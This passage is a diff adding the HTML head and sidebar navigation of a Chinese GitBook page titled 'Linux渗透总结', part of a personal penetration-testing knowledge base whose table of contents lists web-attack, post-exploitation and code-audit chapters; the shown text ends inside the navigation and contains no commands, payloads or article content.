@@ -1,0 +1,3689 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Linux渗透总结 · Khaz's 知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Khaz">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro-fixed/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-d4t/style.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="header-inner">
+        <!-- LOGO -->
+        <a href="/"><div class="logo"></div></a>
+        <span class="title"></span>
+
+        <!-- Search -->
+        
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+
+        <!-- Nav -->
+        <ul class="header-nav">
+            
+        </ul>
+    </div>
+
+    <div class="book-summary">
+        <div class="sidebar-nav-space"></div>
+        
+        
+        <nav role="navigation">
+            
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    01.渗透测试
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    01.信息收集
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../01.渗透测试/01.信息收集/01.资产收集.html">
+            
+                <a href="../../01.渗透测试/01.信息收集/01.资产收集.html">
+            
+                    
+                    01.资产收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../01.渗透测试/01.信息收集/02.指纹识别.html">
+            
+                <a href="../../01.渗透测试/01.信息收集/02.指纹识别.html">
+            
+                    
+                    02.指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../01.渗透测试/01.信息收集/03.敏感信息收集.html">
+            
+                <a href="../../01.渗透测试/01.信息收集/03.敏感信息收集.html">
+            
+                    
+                    03.敏感信息收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" >
+            
+                <span>
+            
+                    
+                    02.Web安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" >
+            
+                <span>
+            
+                    
+                    01.Sql注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1" >
+            
+                <span>
+            
+                    
+                    Mysql
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1.1" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.html">
+            
+                    
+                    Mysql基础操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.1.2" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.html">
+            
+                    
+                    Sql注入详解--Mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.2" >
+            
+                <span>
+            
+                    
+                    Sql Server
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.2.1" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.html">
+            
+                    
+                    Sql注入--MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.3" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/配合其他.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/配合其他.html">
+            
+                    
+                    配合其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" >
+            
+                <span>
+            
+                    
+                    02.文件操作
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.2.1" >
+            
+                <span>
+            
+                    
+                    文件上传
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.2.1.1" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/01.漏洞了解.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/01.漏洞了解.html">
+            
+                    
+                    01.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.2" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/02.黑名单绕过.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/02.黑名单绕过.html">
+            
+                    
+                    02.黑名单绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.3" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/03.白名单绕过.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/03.白名单绕过.html">
+            
+                    
+                    03.白名单绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.4" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/04.WebShell上传.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/04.WebShell上传.html">
+            
+                    
+                    04.WebShell上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.2" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件包含.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.3" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件读取和下载.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件读取和下载.html">
+            
+                    
+                    任意文件读取和下载
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.4" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件预览.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件预览.html">
+            
+                    
+                    文件预览
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" >
+            
+                <span>
+            
+                    
+                    03.命令注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.3.1" data-path="../../01.渗透测试/02.Web安全/03.命令注入/01.漏洞了解.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/03.命令注入/01.漏洞了解.html">
+            
+                    
+                    01.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3.2" data-path="../../01.渗透测试/02.Web安全/03.命令注入/02.漏洞利用.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/03.命令注入/02.漏洞利用.html">
+            
+                    
+                    02.漏洞利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3.3" data-path="../../01.渗透测试/02.Web安全/03.命令注入/03.Dnslog.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/03.命令注入/03.Dnslog.html">
+            
+                    
+                    03.Dnslog
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4" >
+            
+                <span>
+            
+                    
+                    04.跨站脚本攻击
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.4.1" data-path="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/01.前置知识.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/01.前置知识.html">
+            
+                    
+                    01.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4.2" data-path="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/02.漏洞了解.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/02.漏洞了解.html">
+            
+                    
+                    02.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4.3" data-path="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/03.漏洞利用.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/03.漏洞利用.html">
+            
+                    
+                    03.漏洞利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5" >
+            
+                <span>
+            
+                    
+                    05.身份认证
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.5.1" data-path="../../01.渗透测试/02.Web安全/05.身份认证/00.前置知识.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/00.前置知识.html">
+            
+                    
+                    00.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.2" data-path="../../01.渗透测试/02.Web安全/05.身份认证/01.登录框.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/01.登录框.html">
+            
+                    
+                    01.登录框
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.3" data-path="../../01.渗透测试/02.Web安全/05.身份认证/02.越权.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/02.越权.html">
+            
+                    
+                    02.越权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.4" data-path="../../01.渗透测试/02.Web安全/05.身份认证/03.JWT.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/03.JWT.html">
+            
+                    
+                    JWT安全
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.5" data-path="../../01.渗透测试/02.Web安全/05.身份认证/04.OAUTH.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/04.OAUTH.html">
+            
+                    
+                    04.OAUTH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.6" data-path="../../01.渗透测试/02.Web安全/05.身份认证/05.一些案例.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/05.一些案例.html">
+            
+                    
+                    05.一些案例
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.6" >
+            
+                <span>
+            
+                    
+                    06.API接口测试
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.6.1" data-path="../../01.渗透测试/02.Web安全/06.API接口测试/01.前置知识.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/06.API接口测试/01.前置知识.html">
+            
+                    
+                    01.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.6.2" data-path="../../01.渗透测试/02.Web安全/06.API接口测试/03.Tips.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/06.API接口测试/03.Tips.html">
+            
+                    
+                    03.Tips
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.7" >
+            
+                <span>
+            
+                    
+                    07.SSRF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.7.1" data-path="../../01.渗透测试/02.Web安全/07.SSRF/SSRF.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/07.SSRF/SSRF.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.8" >
+            
+                <span>
+            
+                    
+                    08.JSONP与CORS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.8.1" data-path="../../01.渗透测试/02.Web安全/08.JSONP与CORS/CORS.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/08.JSONP与CORS/CORS.html">
+            
+                    
+                    CORS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.8.2" data-path="../../01.渗透测试/02.Web安全/08.JSONP与CORS/JSONP跨域漏洞.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/08.JSONP与CORS/JSONP跨域漏洞.html">
+            
+                    
+                    JSONP跨域漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.9" >
+            
+                <span>
+            
+                    
+                    09.CSRF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.9.1" data-path="../../01.渗透测试/02.Web安全/09.CSRF/CSRF.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/09.CSRF/CSRF.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.10" >
+            
+                <span>
+            
+                    
+                    10.XXE
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.10.1" data-path="../../01.渗透测试/02.Web安全/10.XXE/XXE.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/10.XXE/XXE.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11" >
+            
+                <span>
+            
+                    
+                    11.逻辑漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.11.1" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/01.短信验证码与图形验证码.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/01.短信验证码与图形验证码.html">
+            
+                    
+                    01.短信验证码与图形验证码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.2" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/02.任意用户密码重置.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/02.任意用户密码重置.html">
+            
+                    
+                    02.任意用户密码重置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.3" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/03.支付漏洞.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/03.支付漏洞.html">
+            
+                    
+                    03.支付漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.4" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/04.其他.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/04.其他.html">
+            
+                    
+                    04.其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.12" >
+            
+                <span>
+            
+                    
+                    12.微信小程序
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.12.1" data-path="../../01.渗透测试/02.Web安全/12.微信小程序/小程序与公众号.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/12.微信小程序/小程序与公众号.html">
+            
+                    
+                    小程序与公众号
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.13" >
+            
+                <span>
+            
+                    
+                    13.前端加密对抗
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.13.1" data-path="../../01.渗透测试/02.Web安全/13.前端加密对抗/前端加密渗透.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/13.前端加密对抗/前端加密渗透.html">
+            
+                    
+                    前端加密渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.14" data-path="../../01.渗透测试/02.Web安全/AI大模型.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/AI大模型.html">
+            
+                    
+                    AI大模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.15" data-path="../../01.渗透测试/02.Web安全/Waf绕过学习.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/Waf绕过学习.html">
+            
+                    
+                    WAF绕过学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.16" data-path="../../01.渗透测试/02.Web安全/其他.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/其他.html">
+            
+                    
+                    其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" >
+            
+                <span>
+            
+                    
+                    03.云安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../01.渗透测试/03.云安全/云安全.html">
+            
+                <a href="../../01.渗透测试/03.云安全/云安全.html">
+            
+                    
+                    云安全
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    04.移动安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../01.渗透测试/04.移动安全/APP渗透.html">
+            
+                <a href="../../01.渗透测试/04.移动安全/APP渗透.html">
+            
+                    
+                    APP渗透总结
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../../01.渗透测试/04.移动安全/环境.html">
+            
+                <a href="../../01.渗透测试/04.移动安全/环境.html">
+            
+                    
+                    环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" >
+            
+                <span>
+            
+                    
+                    05.漏洞复现
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../01.渗透测试/05.漏洞复现/Mysql%20Client 任意文件读取攻击.md">
+            
+                <span>
+            
+                    
+                    Mysql Client 任意文件读取攻击复现
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../01.渗透测试/05.漏洞复现/Redis漏洞.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/Redis漏洞.html">
+            
+                    
+                    Redis漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../01.渗透测试/05.漏洞复现/shiro漏洞.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/shiro漏洞.html">
+            
+                    
+                    Shiro漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../01.渗透测试/05.漏洞复现/spring漏洞复现.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/spring漏洞复现.html">
+            
+                    
+                    Spring框架漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../01.渗透测试/05.漏洞复现/Tomcat.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/Tomcat.html">
+            
+                    
+                    Tomcat漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.6" data-path="../../01.渗透测试/05.漏洞复现/Weblogic.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/Weblogic.html">
+            
+                    
+                    Weblogic漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.7" data-path="../../01.渗透测试/05.漏洞复现/应用记录.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/应用记录.html">
+            
+                    
+                    渗透中常见应用记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.8" data-path="../../01.渗透测试/05.漏洞复现/若依漏洞复现.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/若依漏洞复现.html">
+            
+                    
+                    若依漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    02.后渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.1.1" data-path="Linux渗透.html">
+            
+                <a href="Linux渗透.html">
+            
+                    
+                    Linux渗透总结
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" >
+            
+                <span>
+            
+                    
+                    Windows域渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../Windows域渗透/Windows内网渗透.html">
+            
+                <a href="../Windows域渗透/Windows内网渗透.html">
+            
+                    
+                    Windows内网渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../Windows域渗透/入侵痕迹清理.html">
+            
+                <a href="../Windows域渗透/入侵痕迹清理.html">
+            
+                    
+                    入侵痕迹清理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3" data-path="../Windows域渗透/后渗透之了解.html">
+            
+                <a href="../Windows域渗透/后渗透之了解.html">
+            
+                    
+                    后渗透之了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4" data-path="../Windows域渗透/后渗透之基础知识.html">
+            
+                <a href="../Windows域渗透/后渗透之基础知识.html">
+            
+                    
+                    后渗透之基础知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.5" data-path="../Windows域渗透/后渗透之权限提升.html">
+            
+                <a href="../Windows域渗透/后渗透之权限提升.html">
+            
+                    
+                    后渗透之权限提升
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.6" data-path="../Windows域渗透/后渗透之权限维持.html">
+            
+                <a href="../Windows域渗透/后渗透之权限维持.html">
+            
+                    
+                    后渗透之权限维持
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" >
+            
+                <span>
+            
+                    
+                    社会工程学
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" >
+            
+                <span>
+            
+                    
+                    近源
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1.1" data-path="../社会工程学/近源/BadUsb.html">
+            
+                <a href="../社会工程学/近源/BadUsb.html">
+            
+                    
+                    近源渗透之BadUSB
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" >
+            
+                <span>
+            
+                    
+                    钓鱼
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.2.1" data-path="../社会工程学/钓鱼/SPF伪造.html">
+            
+                <a href="../社会工程学/钓鱼/SPF伪造.html">
+            
+                    
+                    初探邮件钓鱼
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../隧道搭建.html">
+            
+                <a href="../隧道搭建.html">
+            
+                    
+                    端口转发与代理搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    03.代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" >
+            
+                <span>
+            
+                    
+                    .Net
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="../../03.代码审计/.Net/.net渗透.html">
+            
+                <a href="../../03.代码审计/.Net/.net渗透.html">
+            
+                    
+                    .net渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" >
+            
+                <span>
+            
+                    
+                    JAVA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" >
+            
+                <span>
+            
+                    
+                    01.基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1" data-path="../../03.代码审计/JAVA/01.基础知识/Java反射.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/Java反射.html">
+            
+                    
+                    Java反射
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2" data-path="../../03.代码审计/JAVA/01.基础知识/Java泛型.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/Java泛型.html">
+            
+                    
+                    Java泛型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.3" data-path="../../03.代码审计/JAVA/01.基础知识/Java类加载器.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/Java类加载器.html">
+            
+                    
+                    Java类加载器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.4" data-path="../../03.代码审计/JAVA/01.基础知识/SPI.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/SPI.html">
+            
+                    
+                    SPI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" >
+            
+                <span>
+            
+                    
+                    02.基础漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.2.1" data-path="../../03.代码审计/JAVA/02.基础漏洞/代码注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/代码注入.html">
+            
+                    
+                    代码注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.2" data-path="../../03.代码审计/JAVA/02.基础漏洞/命令注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/命令注入.html">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
